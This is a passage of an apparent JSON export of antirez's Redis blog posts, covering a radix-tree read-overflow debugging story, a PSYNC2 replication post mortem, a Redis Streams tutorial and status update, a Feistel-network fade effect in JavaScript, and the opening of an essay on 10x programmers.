memory, so the bug would be totally harmless and silent, with the exception of doing the same operations at the end of the mapped region. Finally I had a clear place where to look, this portion of C code:  /* 3. Remove the edge and the pointer by memmoving the remaining children pointer and edge bytes one position before. */ int taillen = parent->size - (e - parent->data) - 1; debugf(\"raxRemoveChild tail len: %d\\n\", taillen); memmove(e,e+1,taillen); /* Since we have one data byte less, also child pointers start one byte before now. */ memmove(((char*)cp)-1,cp,(parent->size-taillen-1)*sizeof(raxNode**)); /* Move the remaining \"tail\" pointer at the right position as well. */ size_t valuelen = (parent->iskey && !parent->isnull) ? sizeof(void*) : 0; memmove(((char*)c)-1,c+1,taillen*sizeof(raxNode**)+valuelen); /* 4. Update size. */ parent->size--;  I asked the user to send me the redis-server binary that produced the crash report, and reading the disassembled code it was clear that many CPU registers, also included in the Redis crash report, would be still populated with the variables above! Note that the CPU registers RDI, RSI, RDX are used in order to pass the first three arguments to memmove. In one of the crashes we had:  parent = RBP = 7f2959dffff Checking RDI, RSI, RDX we extract the memmove() arguments: memmove(00007f2959dffff4,00007f2959dffffd,0000000000000008); The memmove will go out of bound accessing up to 7f2959e00004.  So I had my proof. But there was more, checking other registers I could also reconstruct the node header, in order to understand how the memmove count argument was obtained. Something was definitely wrong there. Basically I was seeing that the disassembled executable did not match the C function I was reading. How was that possible? The read over the buffer should not happen, because the state was sane. Only the count was incorrectly computed by the crashing instance. It was night, and I had worked at this damn thing for two days no stop, so I decided to create a gist and post it on Twitter, to see if somebody could explain how such C would be turned into such assembler by the compiler.  I was lucky enough that my friend Fedor Indutny of Node.js fame was willing to help. He quickly realized that it was very clear why the C and the assembler could not match: what I was analyzing was not the right C code\u2026 but a newer version of the same function. Fedor had a GCC 5.4.0 at hand, the same compiler used by the user reporting the bug, so he tried to compile an older version of the code with it, realizing that now the two versions of the emitted code matched perfectly. He pinged me about it, asking if I was sure that this was a recent Redis version. I was absolutely sure, it was Redis 4.0.6. But then I started to have a few doubts, and I took a diff of rax.c between the Redis unstable branch and Redis 4.0. What happened was that I fixed this bug about ten months ago, in the course of the Streams implementation. During the cherry picking activity, where bugfixes from unstable are backported to Redis 4.0, the fix was inside a commit about streams, so I was constantly skipping it. Everything was finally clear, I had debugged for days a bug that was not there in the version that I was testing.  If it was just a lame mistake from me, why I did bother to write this blog post? Because, I believe, there are lessons to be learned from all this.  The first lesson is that crash reports like the ones Redis is able to emit are a key asset in system software. They allow to reconstruct the state of bugs that you are not able to replicate, but happen very rarely on the wild. While the bug was already fixed, I was able to exactly understand what was happening just looking at the bug reports, register dumps, offending address, and call stack.  The second lesson is that you should learn AMD64 assembler today, at least to read comfortably code emitted by the compiler and follow what is happening, if you want to get involved in system programming. This is often the only way to understand what is happening during an heisenbug. Debuggers won\u2019t help much. GDB was claiming that the crash was happening in the instruction parent->size-- which is, of course impossible. But GDB is not to blame, modern compilers, with optimizations turned on, generate code that can hardly be matched back to the source code.  Another lesson is how powerful well done fuzz testing is. The fuzz tester was immediately able to find the bug in the broken version. Similarly the fact that no radix tree crash was never observed other than this bug fixed a long time ago, speaks for itself. The radix tree implementation is very complex, yet thanks to fuzz testing there are apparently no bugs in the implementation which is so new and so complex. I want to stress the importance of doing fuzzing not just to find crashes: that\u2019s good for security people that want to discover zero days. Fuzzing for system software should perform random operations according to a sane operation model, and compare the outcome with a reference implementation.  And finally, there is a clear lesson for me: next time I need to be more carefully when working at a feature branch and making fixes that are not specific of the feature branch. I was working under the feeling that I would merge everything back into 4.0 ASAP. Then it was not the case, and putting the radix tree update into the same commit implementing Stream things was a fatal error.  Well, bonus point, having smart friends help :-) I was a bit lost at that point, and the kind help of Fyodor helped realize the last part of the puzzle and quickly move forward. Don\u2019t be afraid to ask for help. If you get involved in system software, remember that it is very different than other fields in programming. It\u2019s not just that you do some work and you can bring things forward. You must be prepared to spend days trying to understand why a bug happened, a bug that often you are not able to reproduce, because users deserve more than software crashing like that. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2018-02-07T20:30:39Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8533.7996078, "slug": "a-short-tale-of-a-read-overflow-23", "topics": []}}, {"model": "app.post", "pk": 24, "fields": {"title": "An update on Redis Streams development", "link": "http://antirez.com/news/116", "source": 1, "normalized_link": "antirez.com/news/116", "summary": "I saw multiple users asking me what is happening with Streams, when they\u2019ll be ready for production uses, and in general what\u2019s the ETA and the plan of the feature. This post will attempt to clarify a bit what comes next.  To start, in this moment Streams are my main priority: I want to finish this work that I believe is very useful in the Redis community and immediately start with the Redis Cluster improvements plans. Actually the work on Cluster has already started, with my colleague Fabio Nicotra that is porting redis-trib, the Cluster management tool, inside the old and good redis-cli. This step involves translating the code from Ruby to C. In the meantime, a few weeks ago I finished writing the Streams core, and I deleted the \u201cstreams\u201d feature branch, merging everything into the \u201cunstable\u201d branch.  Later I reviewed again, several times actually, the specification for consumer groups. A few weeks ago I finally was happy with the result, so I started the implementation of this specification: https://gist.github.com/antirez/68e67f3251d10f026861be2d0fe0d2f4. Be aware that command names changed quite a bit\u2026 With the API being more like this: https://gist.github.com/antirez/4e7049ce4fce4aa61bf0cfbc3672e64d.  I\u2019m halfway, after the first 500 lines of code I today was able to see clients using the XREADGROUP command to see only their local history when fetching old messages. This was a milestone in the implementation. Also XACK is now available. Basically all the data structures supporting the streams consumer groups are working, but I need to finish all the commands implementations, support the blocking operations in XREADGROUP and so forth, handle replication, RDB and AOF persistence. More or less in one month I should have everything ready.  Because of consumer groups, the RDB format of the Streams is going to change a lot compared to what \u201cunstable\u201d is using right now. And since there is to break compatibility, we\u2019ll also add the ability of RDB files to persist information about keys last access, so that a Redis restart (or slave loading) involving RDB will get all the info needed in order to continue doing the eviction of keys in the correct way. Right now all that information would be lost instead. Because of this radical RDB changes the plan changed a bit: Streams are going to appear in Redis 5.0 and not 4.0, but 5.0 will be released as GA in about two months: this is possible because 5.0 will be just a 4.0 plus streams, no other major features inside, if not for the RDB changes\u2026  So TLDR: I\u2019m working to Streams almost full time, if not for some time to check PRs / Issues for critical stuff, and in two months if you upgrade to Redis 5.0 you\u2019ll have production ready streams with consumer groups fully implemented. There is also quite of a documentation effort to perform, I\u2019ll write both the command manuals and an extensive introduction to streams once we go RC1, which is in about one month, so that people will have documentation to support their tests during the release candidate stage.  I hope this clarifies what\u2019s happening with Streams. See you soon with Redis 5.0 :-) Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2018-01-25T18:00:34Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8508.6394967, "slug": "an-update-on-redis-streams-development-24", "topics": []}}, {"model": "app.post", "pk": 25, "fields": {"title": "Redis PSYNC2 bug post mortem", "link": "http://antirez.com/news/115", "source": 1, "normalized_link": "antirez.com/news/115", "summary": "Four days ago a user posted a critical issue in the Redis Github repository. The problem was related to the new Redis 4.0 PSYNC2 replication protocol, and was very critical. PSYNC2 brings a number of good things to Redis replication, including the ability to resynchronize just exchanging the differences, and not the whole data set, after a failover, and even after a slave controlled restart. The problem was about this latter feature: with PSYNC2 the RDB file is augmented with replication information. After a slave is restarted, the replication metadata is loaded back, and the slave is able to perform a PSYNC attempt, trying to handshake with the master and receive the differences since the last disconnection.  All this is good news from the point of view of Redis operations, however while PSYNC2 was pretty solid since the introduction in Redis 4.0.0 stable, the feature involving a restarting slave was definitely lacking reliability. There were two problems with this feature: the first being that it was a last-minute addition to PSYNC2, and was not part of the original design document. It was more like an obvious extension of the work we did in PSYNC2, but was not scrutinized at the same level of the rest of the specification for potential bugs and issues. The second problem was due to the fact that the feature is more complex than it looks like initially, for the fact that it\u2019s tricky to really restore *all* the state the replication has in the slave side after a restart. Moreover, failing to restore certain bits of the state, does not result in evident bugs most of the times, so they are hard to spot via integration testings. Only once specific conditions happen the lack of some state will result in problems. For instance failing to correctly reconstruct the currently selected DB in the slave replication state, will create problems only when there are writes happening in different Redis DBs, and such bug would not store correctly the currently selected DB only under special conditions.  Thanks to the help of many Redis contributors, but especially thanks to the @soloestoy Github user, a Redis developer at Alibaba, recently we worked at improving a number of PSYNC2 potential issues. All the work done would finally end inside Redis 4.0.3 in a few days, after much testing of all the patches wrote so far. However once I received issue #4483, I understood I had to rush the release of Redis 4.0.3 because this was far more serious than the other Redis 4 PSYNC2 issues that we had discovered up to that point.  The bug described in issue #4483 was fairly simple, yet very problematic. After a slave restart and a resulting reloading of the replication state from the RDB, the master replication backlog could contain Lua scripts executions in the form of EVALSHA commands. However the slave Lua scripting engine is flushed of all the scripts after the restart, so is not able to process such commands. This results in the slave not processing writes originated by Lua scripts, unless such scripts were using \u201ccommands replication\u201d, which is not the default. The default is to replicate the script itself.  I went a bit in panic mode\u2026 and wrote a few alternative patches that I submitted to the issue. At the end the one that did not require RDB incompatibilities with older versions was picked, so I went ahead and released Redis 4.0.3 ASAP. However I did a mistake\u2026 It\u2019s a few weeks that I work from an office instead of working from home. Normally I do not work at night, but for 4.0.3, when I returned back home, I opened my home laptop and merged the patch into the 4.0 branch, and did some testing activity. The next day when I returned to the office, I continued working from another computer, but I did not realize that I was missing one commit that I merged at home, without pushing it to the repository.  So I basically released a 4.0.3 that had all the PSYNC2 fixes minus the most important one for the replication bug. I released ASAP a new patch level version, Redis 4.0.4, including the replication fix. This was already not great: upgrading Redis is a scheduled activity, and nobody wants to upgrade two times because I make errors in preparing the release\u2026 But the worst was yet to happen. The fix that I added in 4.0.4, the one about scripts replication in restarting slaves performing PSYNC2, had an error that passed totally unnoticed through all the replication integration tests: the fix involved storing the Lua scripts in the slave memory directly into the RDB, in order to reload them later. However it was not considered that the function loading the scripts, would assert if the script was already in memory, so when a slave received a full synchronization from a master, it started to load the RDB file, crashing immediately because of some duplicated script that was already in memory.  A user reported it ASAP via Twitter, and I fixed the problem in less than 45 minutes, from the reporting moment to the 4.0.5 availability, but this does not mitigate all the potential problems that this sequence of failures at delivering a fix caused.  The above problems were caused by a number of reasons:  1. Redis 4.0 was delivered as stable too early, considering the complexity and the amount of code change in PSYNC2. The next time, even at the cost of delaying releases, I\u2019ll wait more and will take the new major versions of Redis more time in the last release candidate, so that we can find such bugs before shipping a GA version.  2. I rushed too much trying to deliver a fix for issue #4483. Even if the bug was critical, it was better to spend some time in order to check what was happening, and the potential problems caused by the fix itself. Moreover I was so much in a hurry that I did not check the set of commits composing 4.0.3 with enough care, causing the lack of one of the fixes, and the need for a new release.  3. While Redis 4.0 has very strict PSYNC2 unit and integration tests, including tests that simulate continuous failovers checking data consistency at every step, because of this bug I discovered that the tests never try to mix PSYNC2 with replication of Lua scripts. This must be improved. Also the PSYNC2 replication after slave RDB restart must be enhanced as well.  I\u2019ll start with the improvements at \u201c3\u201d, and in the future I\u2019ll consider the lessons at \u201c1\u201d and \u201c2\u201d before every new release. My sincere apologize to everybody that had to deal with my errors in this instance, and a big thank you to @soloestoy for an incredible amount of help and support. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2017-12-02T14:44:32Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8404.6981189, "slug": "redis-psync2-bug-post-mortem-25", "topics": []}}, {"model": "app.post", "pk": 26, "fields": {"title": "Streams: a new general purpose data structure in Redis.", "link": "http://antirez.com/news/114", "source": 1, "normalized_link": "antirez.com/news/114", "summary": "Until a few months ago, for me streams were no more than an interesting and relatively straightforward concept in the context of messaging. After Kafka popularized the concept, I mostly investigated their usefulness in the case of Disque, a message queue that is now headed to be translated into a Redis 4.2 module. Later I decided that Disque was all about AP messaging, which is, fault tolerance and guarantees of delivery without much efforts from the client, so I decided that the concept of streams was not a good match in that case.  However, at the same time, there was a problem in Redis, that was not taking me relaxed about the data structures exported by default. There is some kind of gap between Redis lists, sorted sets, and Pub/Sub capabilities. You can kindly use all these tools in order to model a sequence of messages or events, but with different tradeoffs. Sorted sets are memory hungry, can\u2019t model naturally the same message delivered again and again, clients can\u2019t block for new messages. Because a sorted set is not a sequential data structure, it\u2019s a set where elements can be moved around changing their scores: no wonder if it was not a good match for things like time series. Lists have different problems creating similar applicability issues in certain use cases: you cannot explore what is in the middle of a list because the access time in that case is linear. Moreover no fan-out is possible, blocking operations on list serve a single element to a single client. Nor there was a fixed element identifier in lists, in order to say: given me things starting from that element. For one-to-many workloads there is Pub/Sub, which is great in many cases, but for certain things you do not want fire-and-forget: to retain a history is important, not just to refetch messages after a disconnection, also because certain list of messages, like time series, are very important to explore with range queries: what were my temperature readings in this 10 seconds range?  The way I tried to address the above problems, was planning a generalization of sorted sets and lists into a unique more flexible data structure, however my design attempts ended almost always in making the resulting data structure ways more artificial than the current ones. One good thing about Redis is that the data structures exported resemble more the natural computer science data structures, than, \u201cthis API that Salvatore invented\u201d. So in the end, I stopped my attempts, and said, ok that\u2019s what we can provide so far, maybe I\u2019ll add some history to Pub/Sub, or some more flexibility to lists access patterns in the future. However every time an user approached me during a conference saying \u201chow would you model time series in Redis?\u201d or similar related questions, my face turned green.  Genesis =======  After the introduction of modules in Redis 4.0, users started to see how to fix this problem themselves. One of them, Timothy Downs, wrote me the following over IRC:    the module I'm planning on doing is to add a transaction log style data type - meaning that a very large number of subscribers can do something like pub sub without a lot of redis memory growth   subscribers keeping their position in a message queue rather than having redis maintain where each consumer is up to and duplicating messages per subscriber  This captured my imagination. I thought about it a few days, and realized that this could be the moment when we could solve all the above problems at once. What I needed was to re-imagine the concept of \u201clog\u201d. It is a basic programming element, everybody is used to it, because it\u2019s just as simple as opening a file in append mode and writing data to it in some format. However Redis data structures must be abstract. They are in memory, and we use RAM not just because we are lazy, but because using a few pointers, we can conceptualize data structures and make them abstract, to allow them to break free from the obvious limits. For instance normally a log has several problems: the offset is not logical, but is an actual bytes offset, what if we want logical offsets that are related to the time an entry was inserted? We have range queries for free. Similarly, a log is often hard to garbage collect: how to remove old elements in an append only data structure? Well, in our idealized log, we just say we want at max this number of entries, and the old ones will go away, and so forth.  While I was trying to write a specification starting from the seed idea of Timothy, I was working to a radix tree implementation that I was using for Redis Cluster, to optimize certain parts of its internals. This provided the ground in order to implement a very space efficient log, that was still accessible in logarithmic time to get ranges. At the same time I started reading about Kafka streams to get other interesting ideas that could fit well into my design, and this resulted into getting the concept of Kafka consumer groups, and idealizing it again for Redis and the in-memory use case. However the specification remained just a specification for months, at the point that after some time I rewrote it almost from scratch in order to upgrade it with many hints that I accumulated talking with people about this upcoming addition to Redis. I wanted Redis streams to be a very good use case for time series especially, not just for other kind of events and messaging applications.  Let\u2019s write some code =====================  Back from Redis Conf, during the summertime, I was implementing a library called \u201clistpack\u201d.  This library is just the successor of ziplist.c, that is, a data structure that can represent a list of string elements inside a single allocation. It\u2019s just a very specialized serialization format, with the peculiarity of being parsable also in reverse order, from right to left: something needed in order to substitute ziplists in all the use cases.  Mixing radix trees + listpacks, it is possible to easily build a log that is at the same time very space efficient, and indexed, that means, allowing for random access by IDs and time. Once this was ready, I started to write the code in order to implement the stream data structure. I\u2019m still finishing the implementation, however at this point, inside the Redis \u201cstreams\u201d branch at Github, there is enough to start playing and having fun. I don\u2019t claim that the API is 100% final, but there are two interesting facts: one is that at this point, only the consumer groups are missing, plus a number of less important commands to manipulate the stream, but all the big things are implemented already. The second is the decision to backport all the stream work back into the 4.0 branch in about two months, once everything looks stable. It means that Redis users will not have to wait for Redis 4.2 in order to use streams, they will be available ASAP for production usage. This is possible because being a new data structure, almost all the code changes are self-contained into the new code. With the exception of the blocking list operations: the code was refactored so that we share the same code for streams and lists blocking operations, with a great simplification of the Redis internals.  Tutorial: welcome to Redis Streams ==================================  In some way, you can think at streams as a supercharged version of Redis lists. Streams elements are not just a single string, they are more objects composed of fields and values. Range queries are possible and fast. Each entry in a stream has an ID, which is a logical offset. Different clients can blocking-wait for elements with IDs greater than a specified one. A fundamental command of Redis streams is XADD. Yes, all the Redis stream commands are prefixed by an \u201cX\u201d.  > XADD mystream * sensor-id 1234 temperature 10.5 1506871964177.0  The XADD command will append the specified entry as a new element to the specified stream \u201cmystream\u201d. The entry, in the example above, has two fields: sensor-id and temperature, however each entry in the same stream can have different fields. Using the same field names will just lead to better memory usage. An interesting thing is also that the fields order is guaranteed to be retained. XADD returns the ID of the just inserted entry, because with the asterisk in the third argument, we asked the command to auto-generate the ID. This is almost always what you want, but it is possible also to force a specific ID, for instance in order to replicate the command to slaves and AOF files.  The ID is composed of two parts: a millisecond time and a sequence number. 1506871964177 is the millisecond time, and is just a Unix time with millisecond resolution. The number after the dot, 0, is the sequence number, and is used in order to distinguish entries added in the same millisecond. Both numbers are 64 bit unsigned integers. This means that we can add all the entries we want in a stream, even in the same millisecond. The millisecond part of the ID is obtained using the maximum between the current local time of the Redis server generating the ID, and the last entry inside the stream. So even if, for instance, the computer clock jumps backward, the IDs will continue to be incremental. In some way you can think stream entry IDs as whole 128 bit numbers. However the fact that they have a correlation with the local time of the instance where they are added, means that we have millisecond precision range queries for free.  As you can guess, adding two entries in a very fast way, will result in only the sequence number to be incremented. We can simulate the \u201cfast insertion\u201d simply with a MULTI/EXEC block:  > MULTI OK > XADD mystream * foo 10 QUEUED > XADD mystream * bar 20 QUEUED > EXEC 1) 1506872463535.0 2) 1506872463535.1  The above example also shows how we can use different fields for different entries without having to specifying any schema initially. What happens however is that every first message of every block (that usually contains something in the range of 50-150 messages) is used as reference, and successive entries having the same fields are compressed with a single flag saying \u201csame fields of the first entry in this block\u201d. So indeed using the same fields for successive messages saves a lot of memory, even when the set of fields slowly change over time.  In order to retrieve data from the stream there are two ways: range queries, that are implemented by the XRANGE command, and streaming, implemented by the XREAD command. XRANGE just fetches a range of items from start to stop, inclusive. So for instance I can fetch a single item, if I know its ID, with:  > XRANGE mystream 1506871964177.0 1506871964177.0 1) 1) 1506871964177.0    2) 1) \"sensor-id\"       2) \"1234\"       3) \"temperature\"       4) \"10.5\"  However you can use the special start symbol of \u201c-\u201c and the special stop symbol of \u201c+\u201d to signify the minimum and maximum ID possible. It\u2019s also possible to use the COUNT option in order to limit the amount of entries returned. A more complex XRANGE example is the following:  > XRANGE mystream - + COUNT 2 1) 1) 1506871964177.0    2) 1) \"sensor-id\"       2) \"1234\"       3) \"temperature\"       4) \"10.5\" 2) 1) 1506872463535.0    2) 1) \"foo\"       2) \"10\"  Here we are reasoning in terms of ranges of IDs, however you can use XRANGE in order to get a specific range of elements in a given time range, because you can omit the \u201csequence\u201d part of the IDs. So what you can do is to just specify times in milliseconds. The following means: \u201cGive me 10 entries starting from the Unix time 1506872463\u201d:  127.0.0.1:6379> XRANGE mystream 1506872463000 + COUNT 10 1) 1) 1506872463535.0    2) 1) \"foo\"       2) \"10\" 2) 1) 1506872463535.1    2) 1) \"bar\"       2) \"20\"  A final important thing to note about XRANGE is that, given that we receive the IDs in the reply, and the immediately successive ID is trivially obtained just incrementing the sequence part of the ID, it is possible to use XRANGE to incrementally iterate the whole stream, receiving for every call the specified number of elements. After the *SCAN family of commands in Redis, that allowed iteration of Redis data structures *despite* the fact they were not designed for being iterated, I avoided to make the same error again.  Streaming with XREAD: blocking for new data ===========================================  XRANGE is perfect when we want to access our stream to get ranges by ID or time, or single elements by ID. However in the case of streams that different clients must consume as data arrives, this is not good enough and would require some form of pooling (that could be a good idea for *certain* applications that just connect from time to time to get data).  The XREAD command is designed in order to read, at the same time, from multiple streams just specifying the ID of the last entry in the stream we got. Moreover we can request to block if no data is available, to be unblocked when data arrives. Similarly to what happens with blocking list operations, but here data is not consumed from the stream, and multiple clients can access the same data at the same time.  This is a canonical example of XREAD call:  > XREAD BLOCK 5000 STREAMS mystream otherstream $ $  And it means: get data from \u201cmystream\u201d and \u201cotherstream\u201d. If no data is available, block the client, with a timeout of 5000 milliseconds. After the STREAMS option we specify the keys we want to listen for, and the last ID we have. However a special ID of \u201c$\u201d means: assume I\u2019ve all the elements that there are in the stream right now, so give me just starting from the next element arriving.  If, from another client, I send the commnad:  > XADD otherstream * message \u201cHi There\u201d  This is what happens on the XREAD side:  1) 1) \"otherstream\"    2) 1) 1) 1506935385635.0          2) 1) \"message\"             2) \"Hi There\"  We get the key that received data, together with the data received. In the next call, we\u2019ll likely use the ID of the last message received:  > XREAD BLOCK 5000 STREAMS mystream otherstream $ 1506935385635.0  And so forth. However note that with this usage pattern, it is possible that the client will connect again after a very big delay (because it took time to process messages, or for any other reason). In such a case, in the meantime, a lot of messages could pile up, so it is wise to always use the COUNT option with XREAD, in order to make sure the client will not be flooded with messages and the server will not have to lose too much time just serving tons of messages to a single client.  Capped streams ==============  So far so good\u2026 however streams at some point have to remove old messages. Fortunately this is possible with the MAXLEN option of the XADD command:  > XADD mystream MAXLEN 1000000 * field1 value1 field2 value2  This basically means, if the stream, after adding the new element is found to have more than 1 million messages, remove old messages so that the length returns back to 1 million elements. It\u2019s just like using RPUSH + LTRIM with lists, but this time we have a built-in mechanism to do so. However note that the above means that every time we add a new message, we have also to incur in the work needed in order to remove a message from the other side of the stream. This takes some CPU, so it is possible to use the \u201c~\u201d symbol before the count in MAXLEN, in order to specify that we are not really demanding *exactly* 1 million messages, but if there are a few more it\u2019s not a big problem:  > XADD mystream MAXLEN ~ 1000000 * foo bar  This way XADD will remove messages only when it can remove a whole node. This will make having the capped stream almost for free compared to vanilla XADD.  Consumer groups (work in progress) ==================================  This is the first of the features that is not already implemented in Redis, but is a work in progress. It is also the idea more clearly inspired by Kafka, even if implemented here in a pretty different way. The gist is that with XREAD, clients can also add a \u201cGROUP \u201d option. Automatically all the clients in the same group will get *different* messages. Of course there could be multiple groups reading from the same stream, in such cases all groups will receive duplicates of the same messages arriving in the stream, but within each group, messages will not be repeated.  An extension to groups is that it will be possible to specify a \u201cRETRY \u201d option when groups are specified: in this case, if messages are not acknowledged for processing with XACK, they will be delivered again after the specified amount of milliseconds. This provides some best effort reliability to the delivering of the messages, in case the client has no private means to mark messages as processed. This part is a work in progress as well.  Memory usage and saving loading times =====================================  Because of the design used to model Redis streams, the memory usage is remarkably low. It depends on the number of fields, values, and their lengths, but for simple messages we are at a few millions of messages for every 100 MB of used memory. Moreover, the format is conceived to need very minimal serialization: the listpack blocks that are stored as radix tree nodes, have the same representation on disk and in memory, so they are trivially stored and read. For instance Redis can read 5 million entries from the RDB file in 0.3 seconds. This makes replication and persistence of streams very efficient.  It is planned to also allow deletion of items in the middle. This is only partially implemented, but the strategy is to mark entries as deleted in the entry flag, and when a given ratio between entries and deleted entires is reached, the block is rewritten to collect the garbage, and if needed it is glued to another adjacent block in order to avoid fragmentation.  Conclusions end ETA ===================  Redis streams will be part of Redis stable in the 4.0 series before the end of the year. I think that this general purpose data structure is going to put a huge patch in order for Redis to cover a lot of use cases that were hard to cover: that means that you had to be creative in order to abuse the current data structures to fix certain problems. One very important use case is time series, but my feeling is that also streaming of messages for other use cases via TREAD is going to be very interesting both as replacement for Pub/Sub applications that need more reliability than fire-and-forget, and for completely new use cases. For now, if you want to start to evaluate the new capabilities in the context of your problems, just fetch the \u201cstreams\u201d branch at Github and start playing. After all bug reports are welcome :-)  If you like videos, a real-time session showing streams is here: https://www.youtube.com/watch?v=ELDzy9lCFHQ Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2017-10-02T15:12:35Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8287.6155189, "slug": "streams-a-new-general-purpose-data-structure-in-redis-26", "topics": []}}, {"model": "app.post", "pk": 27, "fields": {"title": "Doing the FizzleFade effect using a Feistel network", "link": "http://antirez.com/news/113", "source": 1, "normalized_link": "antirez.com/news/113", "summary": "Today I read an interesting article about how the Wolfenstein 3D game implemented a fade effect using a Linear Feedback Shift Register. Every pixel of the screen is set red in a pseudo random way, till all the screen turns red (or other colors depending on the event happening in the game). The blog post describing the implementation is here and is a nice read: http://fabiensanglard.net/fizzlefade/index.php  You  may wonder why the original code used a LFSR or why I'm proposing a different approach, instead of the vanilla setPixel(rand(),rand()): doing this with a pseudo random generator, as noted in the blog post, is slow, but is also visually very unpleasant, since the more red pixels you have on the screen already, the less likely is that you hit a new yet-not-red pixel, so the final pixels take forever to turn red (I *bet* that many readers of this blog post tried it in the old times of the Spectum, C64, or later with QBASIC or GWBasic). In the final part of the blog post the author writes:   \"Because the effect works by plotting pixels individually, it was hard to replicate when developers tried to port the game to hardware accelerated GPU. None of the ports managed to replicate the fizzlefade except Wolf4SDL, which found a LFSR taps configuration to reach resolution higher than 320x200.\u201d  While not rocket science, it was possibly hard for other resolutions to find a suitable LFSR. However regardless of the real complexity of finding an appropriate LFSR for other resolutions, the authors of the port could use another technique, called a Feistel Network, to get exactly the same result in a trivial way.  What is a Feistel Network? ===  It\u2019s a building block typically used in cryptography: it creates a transformation between a sequence of bits and another sequence of bits, so that the transformation is always invertible, even if you use all the kind of non linear transformations inside the Feistel network. In practical terms the Feistel network can, for example, translate a 32 bit number A into another 32 bit number B, according to some function F(), so that you can always go from B to A later. Because the function is invertible, it implies that for every input value the Feistel network generates *a different* output value.  This is a simple Feistel network in pseudo code:      Split the input into L and R halves (Example: L = INPUT & 0xFF, R = INPUT >> 8)     REPEAT for N rounds:         next_L = R         R = L XOR F(R)         L = next_L     END     RETURN the value composing L and R again into a single sequence of bits: R<<8 | L  So we basically split a (for example) 16 bit integer into two 8 bit integers L and R, perform some transformation for N rounds, and recompose them back into a 16 bit integer, which is our output.  But how is this useful for our problem of implementing FizzleFade? Well you can imagine your 2D screen like a linear array of pixels. If the resolution is 320x200 like in the original game you have from pixel 0 to pixel 63999. So for every integer from 0 to 63999 we can generate a random looking pixel position just by counting and setting the pixel in the position returned by the Feistel network. The problem is that the Feistel network works in bits, so we can\u2019t have exactly from 0 to 63999, we have to pick a power of two which is large enough. The nearest is 16 in this case: with 16 bits we have 65536 integer-to-integer transformations, a few cycles will not be used to set an actual pixel but is not a big waste.  So, this is how our Feistel network looks like, in Javascript:  /* Transforms the 16 bit input into another seemingly psenduo random number  * in the same range. Every input 16 bit input will generate a different  * 16 bit output. This is called a Feistel network. */ function feistelNet(input) {     var l = input & 0xff;     var r = input >> 8;     for (var i = 0; i < 8; i++) {         var nl = r;         var F = (((r * 11) + (r >> 5) + 7 * 127) ^ r) & 0xff;         r = l ^ F;         l = nl;     }     return ((r<<8)|l)&0xffff; }  The non linear transformation \u201cF\u201d I\u2019m using is just a few random multiplications and shifts, picked mostly at random. I\u2019m using 8 rounds even if it is probably not needed with a better F function, but I want the effect to look random (coincidentally drawing random pixels is a decent way to visually spot trivial bad distribution properties).  Implementing this using a Javascript canvas we need a few more functions, to get a 2D context and set a pixel.  The final code is in this Gist: https://gist.github.com/antirez/6d58860b221a6ae5622ced8ccdddbe47  You can see the result here: http://antirez.com/misc/fizzlefade.html  The original problem to explore in this article was to find a way to implement the effect in different resolutions, so even if it is a trivial extension of the 320x200 case, just to make an example, imagine you want to implement the same with 1024*768. There are 786432 pixels, so 2^20 will fit quite well with 1048576 possible integers. We\u2019ll have to modify the Feistel network to have 20 bits input/output by using 10 bits L and R variables, otherwise everything is pretty much the same, but remember to also change the stop condition (that checks the number of frames).  Actually Feistel networks one-to-one pseudo random mapping properties are very useful in other contexts as well. For instance I used it in my radix tree implementation tests (https://github.com/antirez/rax in case you are curious). A good tool to have in a programmer mental box. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2017-08-29T14:35:14Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8222.2857189, "slug": "doing-the-fizzlefade-effect-using-a-feistel-network-27", "topics": []}}, {"model": "app.post", "pk": 28, "fields": {"title": "The mythical 10x programmer", "link": "http://antirez.com/news/112", "source": 1, "normalized_link": "antirez.com/news/112", "summary": "A 10x programmer is, in the mythology of programming, a programmer that can do ten times the work of another normal programmer, where for normal programmer we can imagine one good at doing its work, but without the magical abilities of the 10x programmer. Actually to better characterize the \u201cnormal programmer\u201d it is better to say that it represents the one having the average programming output, among the programmers that are professionals in this discipline.  The programming community is extremely polarized about the existence or not of such a beast: who says there is no such a thing as the 10x programmer, who says it actually does not just exist, but there are even 100x programmers if you know where to look for.  If you see programming as a \u201clinear\u201d discipline, it is clear that the 10x programmer looks like an irrational possibility. How can a runner run 10x faster than another one? Or a construction worker build 10x the things another worker can build in the same time? However programming is a design discipline, in a very special way. Even when a programmer does not participate in the actual architectural design of a program, the act of implementing it still requires a sub-design of the implementation strategy.  So if the design and implementation of a program are not linear abilities, things like experience, coding abilities, knowledge, recognition of useless parts, are, in my opinion, not just linear advantages, they work together in a multiplicative way in the act of creating a program. Of course this phenomenon happens much more when a programmer can both handle the design and the implementation of a program. The more \u201cgoal oriented\u201d is the task, the more a potential 10x programmer can exploit her/his abilities in order to reach the goal with a lot less efforts. When the task at hand is much more rigid, with specific guidelines about what tools to use and how to implement things, the ability of a 10x programmer to perform a lot of work in less time is weakened: it can still exploit \u201clocal\u201d design possibilities to do a much better work, but cannot change in more profound ways the path used to reach the goal, that may include, possibly, even eliminating part of the specification completely from the project, so that the goal to be reached looks almost the same but the efforts to reach it are reduced by a big factor.  In twenty years of working as a programmer I observed other programmers working with me, as coworkers, guided by me in order to reach a given goal, providing patches to Redis and other projects. At the same time many people told me that they believe I\u2019m a very fast programmer. Considering I\u2019m far from being a workaholic, I\u2019ll also use myself as a reference of coding things fast.  The following is a list of qualities that I believe make the most difference in programmers productivity.  * Bare programming abilities: getting sub-tasks done  One of the most obvious limits, or strengths, of a programmer is to deal with the sub-task of actually implementing part of a program: a function, an algorithm or whatever. Surprisingly the ability to use basic imperative programming constructs very efficiently in order to implement something is, in my experience, not as widespread as one may think. In a team sometimes I observed very incompetent programmers, that were not even aware of a simple sorting 